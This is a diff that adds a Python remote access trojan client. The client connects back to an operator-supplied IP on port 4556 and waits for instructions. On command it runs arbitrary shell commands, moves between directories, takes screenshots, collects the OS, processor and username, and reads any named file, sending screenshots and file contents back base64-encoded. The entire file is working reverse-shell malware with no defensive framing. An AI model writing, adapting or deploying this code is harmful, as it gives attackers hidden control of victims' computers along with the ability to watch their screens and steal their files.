@@ -1,0 +1,62 @@
+import platform                                 
+from socket import *
+from PIL import ImageGrab 
+from base64 import b64encode
+from subprocess import check_output
+from os import chdir, getcwd, getlogin, remove
+
+if __name__ == '__main__':                         
+
+    Client  = socket(AF_INET,SOCK_STREAM)   
+    HOST    = "YOUR IP"                    
+    PORT    = 4556                          
+    
+    Client.connect((HOST, PORT))            
+
+    while True:                                                     
+        RawDate    = str(Client.recv(1024), 'utf-8')                
+        Date       = RawDate.split(" ")                            
+        Result     = "404 No Command Found"                
+        MOD        = False                                          
+    
+
+        if Date[0] == "command":                                    
+            try: 
+                output = check_output(Date[1], shell="True")         
+                Result = str(output, 'utf-8')                      
+            except: 
+                output = "ERROR: Wrong command?"                   
+                Result = str(output)                                
+    
+        elif Date[0] == "chdir":                                    
+            if Date[1] == "back":                                  
+                chdir('..')                                         
+                Result = "Back"                                 
+            elif Date[1] == "path":
+                Result = getcwd()                                   
+            elif Date[1] == "chdir":                               
+                chdir(Date[2])                                      
+                Result = "Chdir"                                
+    
+        elif Date[0] == "showScreen":                                       
+            Img  = ImageGrab.grab()                                         
+            Img.save("TMP.png")                                             
+            with open("TMP.png", "rb") as file: output = file.read()        
+            remove("TMP.png")                                               
+            Result = b64encode(bytes(output))                               
+            MOD = True                                                      
+
+        elif Date[0] == "sysinfo":                                                                           
+            Result = f"OS: {platform.platform()}\nProcessor: {platform.machine()}\nDomain: {getlogin()}"      
+
+        elif Date[0] == "file":                                                                               
+            with open(str(Date[2]), "rb") as File:FileDate = File.read()                                      
+            Result = b64encode(FileDate)                                                                      
+            MOD = True                                                                                        
+
+        elif Date[0] == "quit":quit()                                                                        
+    
+        if MOD == True: Client.send(bytes(Result))                                                            
+        elif MOD == False: Client.send(bytes(Result, 'utf-8'))                                                
+    
+    Client.close()                                                                                            
